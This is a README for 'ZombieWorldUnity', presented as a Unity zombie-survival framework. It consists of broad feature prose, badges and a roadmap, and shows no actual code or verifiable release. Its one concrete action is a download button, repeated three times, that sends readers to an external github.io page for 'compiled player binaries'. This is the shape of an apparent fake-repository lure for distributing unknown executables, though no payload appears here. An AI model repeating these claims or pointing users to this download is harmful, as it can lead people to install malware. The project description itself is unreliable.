![preview](https://raw.githubusercontent.com/shotguru913-ui/Zombie-Survival-World/main/shot_5945.svg)
[![Download](https://raw.githubusercontent.com/shotguru913-ui/Zombie-Survival-World/main/btn_368172.svg)](https://shotguru913-ui.github.io/Zombie-Survival-World/)

# 🧟 ZombieWorldUnity — Survivor's Sandbox & Apocalypse Engine for Unity

![Unity](https://img.shields.io/badge/Engine-Unity%202022.3%20LTS-000000?style=for-the-badge&logo=unity&logoColor=white)
![C#](https://img.shields.io/badge/Language-C%23%2011-239120?style=for-the-badge&logo=csharp&logoColor=white)
![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20macOS%20%7C%20Linux%20%7C%20WebGL-4B8BBE?style=for-the-badge&logo=linux&logoColor=white)
![License](https://img.shields.io/badge/License-MIT-yellow?style=for-the-badge&logo=opensourceinitiative&logoColor=white)
![Status](https://img.shields.io/badge/Status-Active%20Development-brightgreen?style=for-the-badge)
![Made%20With](https://img.shields.io/badge/Made%20With-Passion%20%26%20Coffee-ff69b4?style=for-the-badge)
![Multilingual](https://img.shields.io/badge/i18n-12%20Languages-blueviolet?style=for-the-badge)
![Support](https://img.shields.io/badge/Support-24%2F7%20Assistance-orange?style=for-the-badge)

---

## 🌍 A World That Refuses To Stay Dead — Welcome to ZombieWorldUnity

Some projects build games. **ZombieWorldUnity** builds *aftermaths*. It is a modular, open, endlessly moddable survival sandbox framework written in C# for the Unity engine — a foundation upon which developers, hobbyists, and studios can stitch together their own end-of-days scenarios without starting from an empty scene each and every time.

Imagine a city where every window has a story, every rooftop is a decision, and every corner hides either a stranger or a shambler. That is the world this repository tries to give you. It is not merely a game template — it is a *grammar* for apocalypse storytelling: loot tables, noise propagation, morale systems, dynamic weather, territorial factions, and survival pressure curves, all woven into one coherent, extensible codebase.

The project is inspired by the long lineage of community-driven survival sandboxes and the spirit of sharing knowledge that has always powered the modding scene. It is developed openly, discussed openly, and improved by anyone willing to roll up their sleeves.

---

## 📥 Getting The Build

[![Download](https://raw.githubusercontent.com/shotguru913-ui/Zombie-Survival-World/main/btn_368172.svg)](https://shotguru913-ui.github.io/Zombie-Survival-World/)

The distributed build packages include the compiled player binaries, the editor toolkit, sample scenes, documentation bundles, and the localization packs. No external storefront is required — the artifact is self-contained and ready to be inspected, modified, or extended.

---

## 🧭 Table of Contents

- [Concept & Vision](#-concept--vision)
- [Core Feature Matrix](#-core-feature-matrix)
- [Systems Deep Dive](#-systems-deep-dive)
- [Modular Architecture](#-modular-architecture)
- [Responsive Interface Layer](#-responsive-interface-layer)
- [Multilingual Support](#-multilingual-support)
- [Round-the-Clock Assistance](#-round-the-clock-assistance)
- [Scripting & Modding Surface](#-scripting--modding-surface)
- [Performance Notes](#-performance-notes)
- [Accessibility Approach](#-accessibility-approach)
- [Roadmap 2026](#-roadmap-2026)
- [Project Structure](#-project-structure)
- [Contributing](#-contributing)
- [Code of Conduct](#-code-of-conduct)
- [License](#-license)
- [Disclaimer](#-disclaimer)

---

## 🧠 Concept & Vision

ZombieWorldUnity began with a simple frustration: creating a survival game meant rebuilding the same scaffolding over and over — inventory, AI senses, spawn directors, save systems, damage models. Everyone did it alone. Everyone made the same mistakes.

So this repository takes a different stance. It treats the apocalypse as a *platform*. The design philosophy rests on five pillars:

1. **Composability over monoliths** — every system is a module you can disable, replace, or reorder.
2. **Data-driven behavior** — designers tweak values in assets rather than rewrite logic in code.
3. **Predictable simulation** — deterministic ticking makes debugging AI and physics a matter of reading, not guessing.
4. **Open documentation** — no hidden magic; every subsystem carries notes explaining its reasoning.
5. **Respect for the player's time** — fast iteration, quick load, clear feedback.

The result is a sandbox where a solo developer can prototype a full survival loop in an afternoon, and a small team can push the same base into a sprawling, multi-map experience.

---

## ⚙️ Core Feature Matrix

![AI](https://img.shields.io/badge/AI-Behavior%20Trees%20%2B%20Utility-red?style=flat-square)
![Networking](https://img.shields.io/badge/Networking-Client%20%26%20Host%20Ready-blue?style=flat-square)
![Save](https://img.shields.io/badge/Save-Slot%20System-informational?style=flat-square)
![Weather](https://img.shields.io/badge/Weather-Dynamic%20Cycle-9cf?style=flat-square)
![Loot](https://img.shields.io/badge/Loot-Weighted%20Tables-success?style=flat-square)
![Crafting](https://img.shields.io/badge/Crafting-Recipe%20Graph-orange?style=flat-square)
![Voice](https://img.shields.io/badge/Voice-Text%20Prompts-lightgrey?style=flat-square)
![Analytics](https://img.shields.io/badge/Telemetry-Opt--In-yellow?style=flat-square)

| System | Status | Notes |
|--------|--------|-------|
| Survivor Needs (hunger, thirst, fatigue, morale) | ✅ Stable | Curve-based decay with difficulty scaling |
| Zombie Senses (sight, sound, scent) | ✅ Stable | Layer-masked perception cone |
| Horde Director | ✅ Stable | Traffic-light spawning pressure |
| Inventory & Equipment | ✅ Stable | Grid + weight hybrid |
| Crafting & Salvage | ✅ Stable | Graph-based recipe resolution |
| Base Building | 🧪 Beta | Snap-grid + free placement modes |
| Vehicles | 🧪 Beta | Wheel colliders, fuel, damage zones |
| Faction Relations | 🧪 Beta | Reputation & response weighting |
| Multiplayer Co-op | 🚧 Experimental | State sync, host authority |
| Procedural Map Tiles | 🚧 Experimental | Biome blending, POI stamping |

---

## 🔬 Systems Deep Dive

### 🧟 Zombie Cognition & Senses

Every shambler in ZombieWorldUnity is not a scripted actor following a rail. Each one carries a lightweight perception state that weighs **what it sees**, **what it hears**, and **what it remembers**. Sight is masked by field of view, occlusion, and light level. Sound is measured in decibels and decays over distance, so a slammed door three streets away is technically audible but rarely actionable.

Memory works via a *decay stack*: recent stimuli outrank older ones, and once a target is lost, the zombie transitions into a search pattern rather than freezing outright. This small design decision is what makes crowds feel organic instead of robotic.

### 🎒 Inventory, Weight & The Diplomacy of Loot

Players carry items in a hybrid grid-and-weight model. Slots constrain physical bulk; weight constrains endurance. You can technically carry six crowbars, but your character will complain about it — loudly, and that noise attracts attention.

Loot is resolved by weighted tables with conditional modifiers:
- **Location tier** (suburban, industrial, military)
- **Time since last loot cycle**
- **Player noise level**
- **Luck / trait multipliers**

Nothing in this system is hardcoded to a single map. Swap the loot asset and the entire world's economy shifts.

### 🌦 Weather & Time

The day/night cycle influences visibility, zombie aggression thresholds, and ambient audio layers. Weather is a Markov-driven state machine — clear, overcast, drizzle, storm, fog — each with distinct gameplay modifiers. Fog shrinks sight range. Storms elevate ambient noise. Night changes the rules entirely.

### 🏚 Base Building & Fortification

Placement is grid-snapped by default, with a toggle for free placement if you prefer chaotic barricades. Structural pieces carry **integrity health**; zombies apply stress to weak points, and poorly braced walls collapse under sustained pressure. This encourages players to think in terms of funneling rather than turtling.

### 🤝 Faction Reputation

Groups respond to your actions through a shared reputation ledger. Helping a settlement raises standing; looting their supply caches lowers it. Reputation cascades into trade prices, patrol aggression, and whether you get warned before being shot at.

---

## 🧩 Modular Architecture

The codebase is split into cooperative assemblies:

- **ZW.Core** — shared types, math helpers, event bus
- **ZW.Simulation** — needs, AI, weather, time
- **ZW.World** — map loading, streaming, tiles
- **ZW.Interaction** — looting, doors, containers, dialogue hooks
- **ZW.UI** — responsive interface layer
- **ZW.Net** — networking and state replication
- **ZW.Modding** — plugin loader and reflection utilities

Each assembly compiles independently, so a mod author can depend on **ZW.Simulation** alone without dragging in the renderer or network stack.

---

## 📱 Responsive Interface Layer

Interface panels adapt across resolutions from handheld screens to ultrawide monitors. Layouts are authored with flexible anchors, and the HUD swaps density modes automatically: a compact mode for small displays, an expanded mode for large ones.

Elements respond to:
- Aspect ratio changes in real time
- Input method (keyboard/mouse, gamepad, touch)
- Accessibility scaling (font size, contrast, motion reduction)

---

## 🌐 Multilingual Support

![Languages](https://img.shields.io/badge/Locales-12%20%26%20Growing-blueviolet?style=flat-square)

All player-facing strings route through a localization table with support for plural rules, gendered forms, and right-to-left layouts. Current included locales cover major world languages, with the pipeline designed so new languages can be added by dropping a single spreadsheet export into the project.

Adding a locale does not require touching code. Translators work with plain structured data, and the build tool merges it at import time.

---

## 🕐 Round-the-Clock Assistance

![Support](https://img.shields.io/badge/Support-Available%20Around%20the%20Clock-orange?style=flat-square)

Community help channels remain staffed continuously. Whether you're stuck on a behavior tree or curious how loot weights are computed, someone is awake somewhere. Documentation is written to be read, not deciphered — and issue templates guide newcomers toward productive reports.

---

## 🧪 Scripting & Modding Surface

ZombieWorldUnity exposes a stable public API for:
- Registering custom zombie archetypes
- Overriding loot tables at runtime
- Injecting new crafting recipes
- Hooking into the event bus for UI extensions
- Adding new map tiles and props

The plugin loader scans a known directory for assemblies, validates their version compatibility, and hot-registers their contributions before the first scene loads. A malformed plugin is isolated, not fatal.

---

## 🚀 Performance Notes

- Object pooling everywhere — zombies, props, and audio sources are recycled.
- Physics layers tuned so distant hordes simulate in low-fidelity mode.
- LOD transitions blend rather than pop, preserving atmosphere at distance.
- Garbage generation profiled per subsystem; hot paths avoid allocations.

Target: a stable experience on midrange hardware from 2020 onward.

---

## ♿ Accessibility Approach

- Colorblind-safe palette options
- Adjustable text scaling
- Subtitles with speaker tags
- Reduced-motion mode for camera and UI
- Remappable controls for every device

Accessibility is treated as a first-class design concern, not an afterthought bolted on late.

---

## 🗺 Roadmap 2026

![Roadmap](https://img.shields.io/badge/Roadmap-2026-blue?style=flat-square)

- **Q1 2026** — Multiplayer co-op stabilization
- **Q2 2026** — Procedural map generation v2
- **Q3 2026** — Full mod SDK documentation
- **Q4 2026** — Console platform exploration

Milestones are tracked publicly, and the community votes on priorities each quarter.

---

## 📁 Project Structure

A high-level map of the folders:

- **/Assets/ZombieWorld** — scenes, prefabs, art
- **/Assets/ZombieWorld/Scripts** — runtime C# source
- **/Assets/ZombieWorld/Data** — scriptable objects for balance
- **/Packages** — custom pipeline packages
- **/Docs** — design notes and subsystem walkthroughs
- **/Tools** — editor extensions and build scripts

---

## 🤝 Contributing

Contributions of every size are welcome:
- Bug reports with clear reproduction steps
- Documentation improvements (yes, even typo fixes matter)
- Localization additions
- New modules and gameplay prototypes

Please read the design notes inside **/Docs** before opening large pull requests. Align early, ship fast.

---

## 📜 Code of Conduct

Be decent. Critique code, not people. Assume good faith. Ask questions before assuming error. The apocalypse is cooperative here.

---

## 📄 License

This project is released under the **MIT License**. See the full text here:

[MIT License](https://opensource.org/licenses/MIT)

You are welcome to use, modify, distribute, and build upon this work, provided the license notice is preserved.

---

## ⚠️ Disclaimer

ZombieWorldUnity is a fictional entertainment project. All characters, factions, locations, and scenarios depicted are imaginary. Any resemblance to actual persons, organizations, or events is coincidental. The software is provided **as-is**, without warranty of any kind, express or implied, including but not limited to merchantability, fitness for a particular purpose, and non-infringement. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability arising from the use of the software. Users are responsible for ensuring their use complies with local laws and platform policies. This project is intended for creative and educational purposes and does not endorse real-world violence or unsafe behavior.

---

## 🙏 Final Word

ZombieWorldUnity is a small monument to a simple idea: the best worlds are built together, out in the open, where anyone can see the seams and improve the stitching. If you've ever wanted to sculpt an apocalypse — one mercy, one barricade, one terrified midnight at a time — this is your workshop.

[![Download](https://raw.githubusercontent.com/shotguru913-ui/Zombie-Survival-World/main/btn_368172.svg)](https://shotguru913-ui.github.io/Zombie-Survival-World/)